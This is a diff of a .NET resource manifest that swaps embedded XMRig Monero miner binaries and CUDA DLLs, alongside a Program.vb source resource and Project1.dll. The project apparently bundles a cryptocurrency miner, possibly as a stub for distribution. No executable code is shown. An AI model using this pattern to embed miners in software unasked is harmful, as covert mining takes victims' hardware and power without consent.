@@ -124,19 +124,22 @@
   <data name="MoneroPNG" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Monero.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="amd" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\xmrig-amd-notls.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
-  <data name="cpu" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\xmrig.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
-  <data name="nvidia" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\xmrig-nvidia.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="Program" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Program.vb;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
   <data name="Project1" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Project1.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="nvrtc64_101_0" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\nvrtc64_101_0.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="nvrtc_builtins64_101" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\nvrtc-builtins64_101.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\xmrig.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="xmrig_cuda" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\xmrig-cuda.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
 </root>
